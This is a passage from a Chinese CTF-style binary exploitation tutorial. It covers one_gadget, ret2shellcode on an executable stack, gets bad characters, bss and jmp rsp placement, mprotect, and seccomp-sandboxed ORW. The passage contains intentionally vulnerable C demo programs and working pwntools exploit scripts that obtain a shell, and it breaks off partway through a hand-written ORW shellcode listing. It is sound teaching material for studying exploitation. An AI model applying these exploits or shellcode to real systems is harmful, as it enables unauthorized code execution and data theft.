ret2libc 第二轮要摆四格（垫片、gadget、串地址、system）。one_gadget 的卖点是==libc 里存在这样的位置：跳过去就直接执行 `execve("/bin/sh", ...)`==——第二轮的整个 payload 缩成一个地址。

代价是**约束（constraint）**。这些代码段出自 glibc 内部的特定路径，作者假设进入时代码周围的环境长某个样子，比如要求==跳入瞬间 `[rsp+0x40]` 是 NULL==、某个寄存器为 0 之类；前提不满足，execve 半路失败，程序崩掉，现场还未必直观。one_gadget 的输出就是"候选地址 + 各自的约束清单"，做题时二选一：==找到恰好满足约束的时机==（不同函数返回点的栈布局不同），或==在链上垫几格把 rsp 拨到约束要的位置==（垫的思路与 3.5 的对齐垫片同源：数格数）。

装法（工具清单 [[P05-pwntools与GDB插件工具链#10. gadget 搜索：ROPgadget、ropper、one_gadget|P5 第 10 节]]提过，它依赖 Ruby）：

```bash
sudo apt install ruby
sudo gem install one_gadget
one_gadget ./libc.so.6        # 列出候选地址与各自的约束清单
```

没有 Ruby 环境时也有兜底：one_gadget 找的本质是"进入即 execve"的代码片段，==ROPgadget 全量落盘后按 `syscall` 过滤、人工核对每个片段跳入时 rax/rdi/rsi/rdx 从哪来==，同样能找出这类位置——费眼，但不依赖任何安装。

> [!note] 本章的三个演示都没走 one_gadget
> 它的约束是否可满足跟 libc 版本、当时的栈布局强相关，运气成分大；==ret2libc 的通用拼法是基本功，先练熟==。做真题时把 one_gadget 当"第二轮的快捷候选"：先列约束，再看当场栈布局满不满足，满足就省四格。

## 5. ret2shellcode：自己带机器码进场

前两条路线执行的都是别人写好的代码。ret2shellcode 换思路：==把自己生成的机器码写进内存，把返回地址指过去==。它需要两个前提同时成立：那块内存==可执行==（NX 关闭），且==地址可知==。

### 5.1 适用场景：-z execstack

NX 是链接与内核共同执行的约定：程序头里的 GNU_STACK 段标注栈是否可执行（[[P04-Linux安全缓解机制|P4]]）。编译时加 `-z execstack`，链接器把 GNU_STACK 标成 RWE，内核随之把栈页映射成可写可读可执行——==注入的机器码终于能跑==：

```c
/* sc_vuln.c —— ret2shellcode 演示程序：栈页可执行（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);

void vuln(void) {
    char buf[64];
    printf("buf=%p\ninput> ", buf);   /* 打印栈地址：模拟"题目泄露栈地址"的场景 */
    gets(buf);                        /* 漏洞点 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -z execstack sc_vuln.c -o sc_vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/cchO17ES.o: in function `vuln':
sc_vuln.c:(.text+0x2a): warning: the `gets' function is dangerous and should not be used.
```

`printf` 里那个 `%p` 是演示的方便之门：==真实场景里"栈地址可知"通常靠题目泄露==（程序打印、格式化字符串漏洞 [[P09-格式化字符串漏洞|P9]]），也有程序干脆不泄露、地址必须另想办法的版本——5.4 专门处理。checksec 与程序头：

```bash
pwn checksec ./sc_vuln
readelf -lW sc_vuln | grep -E "LOAD|GNU_STACK"
```

输出：

```
[*] '/home/hua/p7/sc_vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
  LOAD           0x000000 0x0000000000400000 0x0000000000400000 0x0005c8 0x0005c8 R   0x1000
  LOAD           0x001000 0x0000000000401000 0x0000000000401000 0x000209 0x000209 R E 0x1000
  LOAD           0x002000 0x0000000000402000 0x0000000000402000 0x000170 0x000170 R   0x1000
  LOAD           0x002df8 0x0000000000403df8 0x0000000000403df8 0x000238 0x000248 RW  0x1000
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
```

> [!note] checksec 的 NX 行在这里会给出怪异读数
> 上面 NX 一行写着 "NX unknown - GNU_STACK missing"，但 readelf 的输出里 GNU_STACK 明明白白存在且是 RWE。==checksec 对 execstack 二进制的判读偶有这类口径不一，以 readelf 的直接输出为准==；要抓的关键行是 `Stack: Executable`、`RWX: Has RWX segments` 和程序头里的 `RWE`。

### 5.2 生成 shellcode，跳回 buf

shellcode 的生成 [[P05-pwntools与GDB插件工具链#7. asm、disasm 与 shellcraft：机器码的生成与阅读|P5 第 7 节]]讲全了——`shellcraft` 选模板、`asm` 汇成字节，本章直接取用。先看几款模板的长度与坏字符情况（坏字符是什么马上讲）：

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'
cands = {
    'sh()': shellcraft.amd64.linux.sh(),
    'execve("/bin/sh",0,0)': shellcraft.amd64.linux.execve('/bin/sh', 0, 0),
    "cat('/flag')": shellcraft.amd64.linux.cat('/flag'),
}
for name, sc_src in cands.items():
    code = asm(sc_src)
    print('%-24s len=%3d  含\\x00=%-5s 含\\x0a=%-5s' % (name, len(code), b'\x00' in code, b'\x0a' in code))
```

输出：

```
sh()                     len= 48  含\x00=False 含\x0a=False
execve("/bin/sh",0,0)    len= 37  含\x00=False 含\x0a=False
cat('/flag')             len= 53  含\x00=False 含\x0a=False
```

三款模板都干净（==pwntools 的模板用 xor 小动作避免了字面 `\0`==，P5 第 7 节的逐条反汇编看过这个技巧）。本题选 37 字节的 `execve("/bin/sh", 0, 0)` 版，原因放折叠框。

payload 的布局：shellcode 放 buf 开头，后面填到偏移，返回地址指回 buf——gets 把整份 payload 写进 buf，vuln 返回时 rip 落在 buf 上，==从 payload 的第一个字节开始执行==：

```asm
; ret2shellcode 的栈布局（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）
;   [shellcode 37 字节]   ← vuln 的 ret 之后，rip 从这里开跑
;   [填充到 72 字节    ]
;   [buf 的地址       ]   ← 返回地址槽：泄露得到的运行期地址
```

```python
#!/usr/bin/env python3
# exp_shellcode.py —— ret2shellcode：栈上执行，返回地址跳回泄露的 buf
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

OFFSET = 72                            # buf 在 rbp-0x40：64 字节 buf + 8 字节 saved rbp

# execve("/bin/sh", 0, 0) 模板：只向下 push 两次，不会蹭到自己的尾部（sh() 模板的坑见下方折叠框）
sc = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))
print('shellcode 长度 =', len(sc), '| 含坏字节:', b'\x00' in sc or b'\x0a' in sc)

io = process('./sc_vuln')
io.recvuntil(b'buf=')
buf = int(io.recvline().strip(), 16)   # 演示程序自己打印的栈地址
success('buf @ ' + hex(buf))

io.sendlineafter(b'input> ', sc.ljust(OFFSET, b'B') + p64(buf))
time.sleep(0.5)                        # 等 gets 把 payload 这行读完，再发 shell 命令
io.sendline(b'cat flag.txt; echo p7_shell_ok')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

```bash
python3 exp_shellcode.py
```

输出：

```
shellcode 长度 = 37 | 含坏字节: False
[x] Starting local process './sc_vuln'
[+] Starting local process './sc_vuln': pid 4817
[+] buf @ 0x7ffc80478700
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 26B
[x] Receiving all data: 38B
[+] Receiving all data: Done (38B)
[*] Process './sc_vuln' stopped with exit code 0 (pid 4817)
flag{p7_getshell_via_rop}
p7_shell_ok
```

三个前提各就各位：栈可执行、地址靠程序打印、shellcode 干净——一次交互拿到 shell。

> [!info]- sh() 模板的一个坑：搭 argv 的 push 会蹭到自己的尾巴
> 48 字节的 `sh()` 模板要==在栈上搭 `execve` 的 argv 数组==，靠一连串 push 往下写（完整反汇编 [[P05-pwntools与GDB插件工具链#7. asm、disasm 与 shellcraft：机器码的生成与阅读|P5 第 7 节]]逐条列过）。push 向低地址生长，5 次 push 最多写到 rsp−0x28。本布局里 shellcode 执行时 rsp = buf+0x50，往下 0x28 字节正好盖到 buf+0x28——==shellcode 自身的最后 8 个字节被它自己搭 argv 的动作覆盖==，执行到尾部就是垃圾指令。两种摆法、两个模板做一组对照（`at_buf` 指"shellcode 放 buf 开头、返回地址直指 buf"，`after_ret` 指"shellcode 挪到返回地址槽之后"）：
>
> ```text
> sh()      at_buf    -> no shell (b'<process dead>')
> sh()      after_ret -> OK
> execve    at_buf    -> OK
> ```
>
> 第一行的 `<process dead>` 是脚本随后向它发命令时的报错形态——进程已死，管道断开。后两种规避法都成立：换 push 更少的模板；或把 shellcode 挪到返回地址槽==之后==、返回地址指它的第一个字节——此时 rsp 恰好指着 shellcode 起点，push 全部落在它下方，与 5.4 的 jmp rsp 是同一原理。==拿到一段新 shellcode，先数它的 push 深度，再看你的布局里 rsp 落在哪==。

### 5.3 坏字符：0x0a 让 gets 提前刹车

payload 是逐字节数据，其中有些字节==过不了运输关==：输入函数在哪停，哪些字节就进不了缓冲（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]的停止规则表）。gets 只认一个停止符——`\x0a`。生成的 shellcode 先扫一遍坏字符是固定动作，但"从网上抄一段"或"给模板加点功能"都可能把坏字节带进来。造一个最小事故：给 shellcode 打头加一条含 `\x0a` 的指令（比如想先备一个换行符常量）：

```python
#!/usr/bin/env python3
# exp_badchar.py —— 坏字节演示：带 0x0a 的 shellcode 过不了 gets
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

sc_clean = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))
sc_bad   = asm('mov r8, 0xa') + sc_clean      # 打头加一条含 0x0a 的指令
print('干净模板含 0x0a:', b'\x0a' in sc_clean, '| 加料版含 0x0a:', b'\x0a' in sc_bad)
print('加料版前 8 字节  :', sc_bad[:8].hex(' '))

io = process('./sc_vuln')
io.recvuntil(b'buf=')
buf = int(io.recvline().strip(), 16)
io.sendlineafter(b'input> ', sc_bad.ljust(72, b'B') + p64(buf))
io.sendline(b'cat flag.txt')
try:
    print('收到:', io.recvline().decode().strip())
except EOFError:
    print('EOF')
io.close()
```

```bash
python3 exp_badchar.py
```

输出：

```
干净模板含 0x0a: False | 加料版含 0x0a: True
加料版前 8 字节  : 49 c7 c0 0a 00 00 00 48
收到: bye
```

没有 shell，程序打印 `bye` 正常退出——==vuln 的返回地址槽根本没被改过==。逐字节看：`mov r8, 0xa` 编码成 `49 c7 c0 0a 00 00 00`，第 4 个字节是 `0a`，==gets 在这里刹车==，后面 76 个 payload 字节（包括返回地址槽的 8 个）全没进缓冲。注意前 3 个字节 `49 c7 c0` 和三个 `\x00` 都进了缓冲——==gets 不怕 `\x00`，只怕 `\x0a`==（P6 第 7 节的对照实验）。

两条修法：

- **换一条干净的**（上面的正路）：生成后先扫 `b'\x0a' in sc`，命中就换模板、换路径写法，pwntools 内置模板绝大多数可直接过 gets；
- **编码**：把 shellcode 逐字节与一个密钥异或，坏字符落不到坏字节表上，再在 shellcode 头部垫一小段解码器，执行时先原地还原再继续——==省事程度通常不如换模板==，但 shellcode 功能被限定、模板都没有干净版时它是正解。

> [!info]- 编码要编码"解码器之后"的所有字节
> 解码器本身也是字节，它必须天然不带坏字符；被编码的是它后面的主体。解码循环形如"取一字节、异或密钥、写回去、指针推进、没到尾就跳回"，pwntools 内置了按坏字符表自动选编码的编码器（`pwnlib.encoders`），手工写也只占十几字节。做多轮异或、滚动密钥属于进阶玩法，思想相同：==让落在运输线上的每一个字节都不踩坏字符表==。

### 5.4 bss 方案：栈地址拿不到时

5.2 的前提之一是拿到栈地址。题目若不泄露呢？经典去处是 ==bss 段==：全局变量的家，非 PIE 下地址是编译期常量，`nm` 一查就有——写入用程序自己的输入函数，地址写死在 payload 里，栈随机化完全无关。演示程序把 shellcode 的落点改成 bss：

```c
/* bss_vuln.c —— ret2shellcode 的 bss 方案演示（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);

char blob[256];               /* 全局数组，落在 .bss；非 PIE 下地址固定 */

/* 演示程序代码量小，搜不到现成的 jmp rsp；内联汇编自备一段（P6 自备 pop rdi; ret 同款做法） */
void gadget(void) {
    __asm__("jmp *%rsp");
}

void vuln(void) {
    char buf[32];
    printf("blob> ");
    gets(blob);               /* 第一行输入：shellcode 存进 bss */
    printf("input> ");
    gets(buf);                /* 第二行输入：溢出，改返回地址 */
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -z execstack bss_vuln.c -o bss_vuln
```

输出：

```
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccG7cawz.o: in function `vuln':
bss_vuln.c:(.text+0x2e): warning: the `gets' function is dangerous and should not be used.
```

```bash
nm bss_vuln | grep -E ' B blob$| T gadget$'
```

输出：

```
0000000000404060 B blob
0000000000401176 T gadget
```

`blob` 固定在 0x404060。按经典做法拼一把：第一行输入把 shellcode 送进 blob，第二行溢出、返回地址指 0x404060：

```python
#!/usr/bin/env python3
# exp_bss.py —— 经典 bss 方案：返回地址指到 bss 里的 shellcode
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

OFFSET = 40
BLOB   = 0x404060                 # nm bss_vuln | grep blob

sc = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))

io = process('./bss_vuln')
io.sendlineafter(b'blob> ', sc)                # shellcode 落进 bss
io.sendlineafter(b'input> ', flat(b'A' * OFFSET, BLOB))
try:
    io.sendline(b'cat flag.txt')
    print('收到:', io.recvline().decode().strip())
except EOFError:
    print('EOF：跳进 bss 后 shellcode 没能执行')
io.close()
```

```bash
python3 exp_bss.py
```

输出：

```
[x] Starting local process './bss_vuln'
[+] Starting local process './bss_vuln': pid 4851
EOF：跳进 bss 后 shellcode 没能执行
[*] Stopped process './bss_vuln' (pid 4851)
```

链的每一步都成立——写入成功、偏移没错、地址是常量——程序还是死在跳过去的瞬间。看进程的页权限就知道为什么（停在第一次 gets 时读 `/proc/<pid>/maps`，==进程活着的时候页权限才是真的==）：

```python
#!/usr/bin/env python3
# exp_maps.py —— 看 -z execstack 之后各页的真实权限
from pwn import *

context.log_level = 'error'

io = process('./bss_vuln')
io.recvuntil(b'blob> ')           # 停在第一次 gets，进程还活着
maps = open('/proc/%d/maps' % io.pid).read()
for line in maps.splitlines():
    if 'rwx' in line or line.startswith('00401') or line.startswith('00404'):
        print(line)
io.close()
```

```bash
python3 exp_maps.py
```

输出：

```
00401000-00402000 r-xp 00001000 08:30 41555                              /home/hua/p7/bss_vuln
00404000-00405000 rw-p 00003000 08:30 41555                              /home/hua/p7/bss_vuln
7ffd2f857000-7ffd2f878000 rwxp 00000000 00:00 0                          [stack]
```

三行各一句话：0x401000 代码段 `r-x`；==0x404000 数据段（含 blob 所在的 bss）只有 `rw-`==；栈 `rwx`。结论：==`-z execstack` 只把栈页放开成可执行，bss 页仍是普通数据页==——"写进 bss 再跳过去"这个老教材的经典做法，在今天的 x86-64 内核上需要额外条件才成立（老环境靠内核对部分程序"可读即可执行"的让步，现代程序则要靠 5.5 的 mprotect 自己把页改出来）。5.1 的 readelf 也早有预告：那个 RW 的 LOAD 段罩着 bss，GNU_STACK 的 RWE 只管栈。

栈地址未知，出路有两条。

**出路一：让跳转目标跟着 rsp 走。**`jmp rsp`（机器码 `ff e4`）执行时==rsp 指着哪，就跳进哪==。把它放在返回地址槽，把 shellcode 紧跟在槽后：vuln 的 ret 弹出 `jmp rsp` 的地址时，rsp 恰好推进到紧跟的那个字节——正是 shellcode 的第一个字节：

```asm
; jmp rsp 布局（x86-64 Linux / System V AMD64 ABI，从 buf 起向高地址）
;   [40 字节填充        ]   填满 buf 与 saved rbp
;   [jmp rsp 的地址     ]   ← vuln 的 ret 落在这里；弹出后 rsp 恰指下一格
;   [shellcode          ]   ← jmp rsp 的落点，一字节不差
```

演示程序里 `jmp rsp` 在 gadget 函数内、指令地址 0x40117e（x86-64 Linux / System V AMD64 ABI，反汇编确认 `ff e4`）：

```bash
objdump -d -M intel bss_vuln | sed -n '/<gadget>:/,/^$/p'
```

输出：

```asm
0000000000401176 <gadget>:
  401176:	f3 0f 1e fa          	endbr64
  40117a:	55                   	push   rbp
  40117b:	48 89 e5             	mov    rbp,rsp
  40117e:	ff e4                	jmp    rsp
  401180:	90                   	nop
  401181:	5d                   	pop    rbp
  401182:	c3                   	ret
```

```python
#!/usr/bin/env python3
# exp_jmprsp.py —— 栈地址未知的替代：jmp rsp 让跳转目标跟着 rsp 走
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

OFFSET  = 40
JMP_RSP = 0x40117e                # jmp rsp（0xff 0xe4），bss_vuln 里 gadget 函数中的那条指令

sc = asm(shellcraft.amd64.linux.sh())

io = process('./bss_vuln')
io.sendlineafter(b'blob> ', b'P7')            # bss 通道放一个占位输入，本链不依赖它
io.sendlineafter(b'input> ', flat(b'A' * OFFSET, JMP_RSP, sc))
time.sleep(0.5)                    # 等 gets 把 payload 这行读完，再发 shell 命令
io.sendline(b'cat flag.txt; echo p7_shell_ok')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

```bash
python3 exp_jmprsp.py
```

输出：

```
[x] Starting local process './bss_vuln'
[+] Starting local process './bss_vuln': pid 4861
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 26B
[x] Receiving all data: 38B
[+] Receiving all data: Done (38B)
[*] Process './bss_vuln' stopped with exit code 0 (pid 4861)
flag{p7_getshell_via_rop}
p7_shell_ok
```

==整条 payload 里没有一个运行期地址==——栈地址不知道，照样落进自己的 shellcode。顺带两点：`sh()` 模板在这里随便用，rsp 指着 shellcode 起点，它搭 argv 的 push 全落在下方（5.2 折叠框里 after_ret 一行的原理）；`jmp rsp` 这种片段真实题目里去哪找——静态落盘后 `grep "jmp rsp$"`，libc 里就有：

```bash
grep "jmp rsp$" g_libc.txt
```

输出：

```
0x00000000000de2a2 : add byte ptr [rcx - 0x48], al ; add eax, dword ptr [rax] ; add cl, ch ; jmp rsp
0x00000000000de2a8 : add cl, ch ; jmp rsp
0x00000000000de2a5 : add eax, dword ptr [rax] ; add cl, ch ; jmp rsp
0x00000000000de2aa : jmp rsp
```

取 0xde2aa 加基址即可（用前三种"多带了搭头"的也行，搭头先执行）。当然，==能用 libc 的前提是基址已知==——无泄露场景里还得指望程序自身或题目故意留的片段。

**出路二：mprotect——把页权限自己改出来**，NX 开着也适用，单列一节。

### 5.5 mprotect：把一块内存改成可执行

mprotect 是改页权限的系统调用，[[04-汇编语言精要#10. 系统调用：程序开口找内核办事|通用基础 04 章第 10 节]]的调用号表里它编号 10。思路一句话：==shellcode 先写进一块地址已知的内存（bss），再用 ROP 链调 mprotect 把那一页改成可执行，然后跳过去==——它把 5.4 缺的"页可执行"亲手补上，因此 NX 开着也能走通。

| 参数 | 寄存器 | 含义 |
| ---- | ---- | ---- |
| addr | rdi | 起始地址，==必须按页对齐==（0x1000 的整数倍，bss 地址向下取整到页边界） |
| len | rsi | 长度（内核按整页生效） |
| prot | rdx | 权限位：1=读，2=写，4=执行；读、写、执行全开就是 7 |

拼一条完整链需要的零件清单：

- 装寄存器的 gadget：`pop rdi ; ret`、`pop rsi ; ret`（或带搭头的变体）、`pop rdx ; ... ; ret`——2.3 刚练过怎么搜、怎么垫废值；
- 一条 `syscall` gadget（或直接调 `mprotect` 的 PLT——程序用过它才有）；
- 一个写入通道：`read@plt`/`gets` 把 shellcode 先送进 bss；
- 一个地址已知的可写位置：非 PIE 的 bss，从 `nm` 拿。

链序：`read(0, bss, n)` 写入 → `mprotect(bss 起始页, 长度, 7)` → 返回地址落到 bss。三段各是一组"pop 装参 + 函数地址"，链会很长，但每一格的拼法都是本章与 P6 已练的动作组合。把这条链完整拼出来，放到 [[P08-ROP进阶与SROP|P8]]学过栈迁移之后再做正合适——那时还能学到让长链变短的办法。

## 6. seccomp 沙箱与 ORW：execve 被禁之后

前五节的终点都是 shell。有一类题把这条路从根上堵死：程序启动时用 **seccomp** 给自己装了一个系统调用过滤器，`execve` 一触发进程当场被内核杀掉——控制流哪怕完全打穿，shell 也开不起来。思路要调整：==拿 shell 只是手段，读 flag 才是目的==。`open`、`read`、`write` 三个系统调用就能完成读文件的全流程，绝大多数沙箱不禁它们——这条出口按三个调用的首字母叫 **ORW**。本节造两个演示程序把整条链走通：一个用 shellcode，一个用 ROP；过滤器怎么读、文件描述符怎么分配、短读怎么处理，都在这两题里展开。

### 6.1 seccomp：给进程装一个系统调用过滤器

seccomp（secure computing mode）是内核提供的系统调用过滤机制。进程用 `prctl` 往内核装一段 BPF 程序，此后每一次系统调用都先过这段程序，按它的裁决放行、报错或杀掉进程。装过滤器固定两步：

```c
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);             /* 前置：声明本进程不再提权 */
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);  /* 装入过滤器 */
```

非特权进程必须先设 `PR_SET_NO_NEW_PRIVS` 才装得上过滤器。`prog` 是一组 BPF 指令，判读对象是一个固定的 `seccomp_data` 结构：

| 偏移 | 字段 | 内容 |
| ---- | ---- | ---- |
| 0 | nr | 系统调用号 |
| 4 | arch | 架构标识，x86-64 是 `AUDIT_ARCH_X86_64` |
| 8 | instruction_pointer | 发起调用的指令地址 |
| 16 | args[6] | 六个参数的原始值 |

BPF 指令只有三个动作：`LD` 把某个字段装进累加器 A；`JEQ` 比较 A 与常数、按结果跳转；`RET` 给出裁决——`SECCOMP_RET_ALLOW` 放行，`SECCOMP_RET_KILL` 杀进程，`SECCOMP_RET_ERRNO` 把这次调用变成一个错误码返回。演示程序一（6.2 用 shellcode 打它）：

```c
/* orw_sc.c —— ORW 演示程序一：seccomp 白名单 + 栈页可执行（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>
#include <sys/syscall.h>

/* 白名单过滤器：只放行 read/write/open/openat/close/exit/exit_group，其余杀掉进程 */
static void install_seccomp(void) {
    struct sock_filter filter[] = {
        /* 第 0 关：校验架构（seccomp_data 偏移 4 是 arch 字段），不是 x86-64 直接杀 */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 4),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        /* 第 1 关：加载系统调用号（偏移 0） */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 0),
        /* 第 2 关：白名单逐个比对，命中即放行 */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_read, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_write, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_open, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_openat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_close, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_exit, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_exit_group, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        /* 落到这里：不在白名单，杀 */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);   /* 装过滤器的非特权前置条件 */
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

void vuln(void) {
    char buf[64];
    printf("buf=%p\ninput> ", buf);
    read(0, buf, 0x200);          /* 漏洞点：0x200 进 64 字节 buf */
}

int main(void) {
    setbuf(stdout, NULL);
    install_seccomp();
    vuln();
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -z execstack orw_sc.c -o orw_sc
```

输出：

```
orw_sc.c: In function 'vuln':
orw_sc.c:48:5: warning: 'read' writing 512 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
   48 |     read(0, buf, 0x200);          /* 漏洞点：0x200 进 64 字节 buf */
      |     ^~~~~~~~~~~~~~~~~~~
……（note 行省略）
```

溢出警告指着的正是漏洞点（[[P06-栈溢出原理与ret2win#1.1 示例程序与编译|P6 1.1]] 的 gets 同款），编译照常通过。`-z execstack` 是 6.2 的 shellcode 要用的，与 seccomp 互不干扰。

过滤器装好之后长什么样，不用读源码——**seccomp-tools** 把运行中的进程实际装上的过滤器 dump 成可读格式（Ruby 工具，`gem install seccomp-tools` 安装，与第 4 节的 one_gadget 同源）：

```bash
echo | seccomp-tools dump ./orw_sc
```

输出：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```

三段与源码一一对应：0000–0002 校验架构，0003 加载调用号，0004–0017 白名单逐个放行（read、write、open、openat、close、exit、exit_group），0018 兜底杀掉。==做题先跑 seccomp-tools dump——白名单就是出口的形状==：`execve` 不在、ORW 三样在，路线当场定下。

> [!info]- 开头为什么先校验架构
> 调用号表是按架构分的：x86-64 的 59 号是 execve，32 位调用路径（`int 0x80`）的 59 号却是另一个调用。x86-64 进程完全可以用 32 位指令发起系统调用，绕开 x86-64 的调用号白名单。所以正规的过滤器先比对 `arch` 字段，不是 x86-64 的调用直接杀——0001 行的 `0xc000003e` 就是 `AUDIT_ARCH_X86_64` 的值。自己写过滤器时，这一段不要省。

ORW 用到的调用号与参数（x86-64 Linux / System V AMD64 ABI，完整约定 [[04-汇编语言精要#10. 系统调用：程序开口找内核办事|通用基础 04 章第 10 节]]整理过）：

| 调用 | 号 | 参数 |
| ---- | ---- | ---- |
| read | 0 | rdi = fd，rsi = 缓冲，rdx = 请求字节数 |
| write | 1 | rdi = fd，rsi = 缓冲，rdx = 字节数 |
| open | 2 | rdi = 路径，rsi = flags（O_RDONLY = 0），rdx = mode |
| close | 3 | rdi = fd |
| openat | 257 | rdi = dirfd，rsi = 路径，rdx = flags，r10 = mode |

rax 放调用号——与 2.1 的 execve 完全同一副约定，==ORW 链没有新知识，只有新的调用号==。

沙箱真的会拦。对照实验：把 5.2 的 execve shellcode 原样送进演示程序一：

```python
#!/usr/bin/env python3
# exp_sigsys.py —— 对照实验：换成 execve 的 shellcode，沙箱当场杀进程
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

sc = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))

io = process('./orw_sc')
io.recvuntil(b'buf=')
buf = int(io.recvline().strip(), 16)
io.send(sc.ljust(72, b'B') + p64(buf))
io.recvall(timeout=3)
print('进程退出状态 =', io.poll(True))
io.close()
```

```bash
python3 exp_sigsys.py
```

输出：

```
进程退出状态 = -31
```

-31 是 SIGSYS 的信号编号：==内核在系统调用入口直接发出的信号==，不经过程序自己的任何代码。做沙箱题看到退出状态 -31，第一反应就是"这次调了白名单外的调用"。

### 6.2 ORW shellcode：手写三条 syscall

5.2 的模板清单里那款 `cat('/flag')`，内部就是本章这套流程。拆开手写一遍，全程四步——拼路径、open、read 循环、写出：

```asm
; orw_flag.s —— 读当前目录 flag.txt 打到 stdout（x86-64 Linux，System V AMD64 ABI）
global _start

section .text
_start:
    xor  esi, esi                 ; O_RDONLY = 0
    push rsi                      ; 8 字节 0 压栈，充当串尾的 '\0'
    mov  rax, 0x7478742e67616c66  ; "flag.txt" 八个字节按小端排成的整数
    push rax                      ; 压栈后 rsp 处正好是 "flag.txt\0"
    mov  rdi, rsp                 ; 第 1 步：rdi = 路径
    xor  edx, edx                 ; mode 置 0（只读打开用不到）
    mov  eax, 2                   ; __NR_open = 2
    syscall                       ; 第 2 步：open，成功时 rax = 分到的 fd
    mov  r12d, eax                ; fd 转存进 r12d：后面的 syscall 会覆盖 rax
    sub  rsp, 0x100               ; 栈上留 0x100 当读入缓冲
.read:
    mov  edi, r12d                ; 第 3 步：read(fd, rsp, 0x100)
